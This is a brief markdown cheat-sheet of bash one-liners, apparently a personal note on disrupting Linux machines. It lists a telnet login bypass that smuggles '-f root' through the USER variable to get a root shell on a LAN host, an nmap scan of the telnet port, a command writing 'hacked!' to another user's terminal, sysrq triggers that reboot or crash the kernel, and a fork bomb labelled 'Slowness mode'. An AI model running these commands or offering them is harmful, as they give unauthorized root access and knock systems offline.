## Telnet issue
```bash
ping 192.168.1.251
```

```bash
USER='-f root' telnet -a 192.168.1.251
```

```bash
nmap -sV -p 23 192.168.1.251
```
[[nmap]]

## Terminal
to see terminal
```bash
tty
```
```bash
ps -eo user,tty | grep -v \? | sort -u
```
```bash
watch -n 1 "ps -eo user,tty | grep -v \? | sort -u"
```
```bash
echo hacked! > /dev/pts/1
```

# Kernel
```bash
echo l > /proc/sysrq-trigger
```
```bash
echo m > /proc/sysrq-trigger
```
! Don't try at home !
```bash
echo b > /proc/sysrq-trigger
```
```bash
echo c > /proc/sysrq-trigger
```

# Slowness mode
```bash
:(){ :|:& };:
```